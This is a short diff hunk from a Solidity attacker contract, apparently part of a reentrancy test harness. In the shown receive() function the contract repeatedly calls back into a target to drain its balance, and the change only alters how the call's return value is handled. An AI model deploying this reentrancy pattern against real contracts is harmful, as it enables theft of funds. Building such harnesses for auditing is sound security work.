@@ -130,9 +130,8 @@ contract SingleReentrant {
     receive() external payable {
         if (attackCount < maxAttacks && target.balance > 0) {
             attackCount++;
-            (bool success,) = target.call(attackCalldata);
             // Don't require success - may run out of funds
-            success;
+            target.call(attackCalldata);
         }
     }
 }
